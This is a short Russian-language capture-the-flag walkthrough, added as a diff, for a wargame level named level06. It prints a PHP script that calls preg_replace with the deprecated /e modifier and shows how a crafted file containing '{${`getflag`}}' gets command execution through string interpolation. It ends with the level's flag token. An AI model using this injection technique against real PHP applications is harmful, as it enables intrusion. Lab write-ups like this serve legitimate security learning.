@@ -1,0 +1,24 @@
+
+1) Видим скрипт level06 и его исходный код level06.php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+2) Модификатор /e устаревший и он может привести к уязвимости показано, как использовать эту уязвимость на сайте https://z5h64q92x9.net/proxy_u/en-ru.ru.990e73d9-60bce220-c2b90fb5-74722d776562/https/www.php.net/manual/en/language.types.string.php и мы нашли следующую команду: 
+
+echo "This is the value of the var named by the return value of getName(): {${getName()}}"
+
+3) Для нас внутри нужно заменить на `getflag` (внимание на кавычки)
+
+4) По скрипту видно, что нужен файл, поэтому создадим его в папке /tmp, т.к. есть к ней доступ:
+echo '[x {${`getflag`}}]' > /tmp/getflag
+
+
+5) ./level06 /tmp/getflag
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+Ответ: wiok45aaoguiboiki2tuin6ub
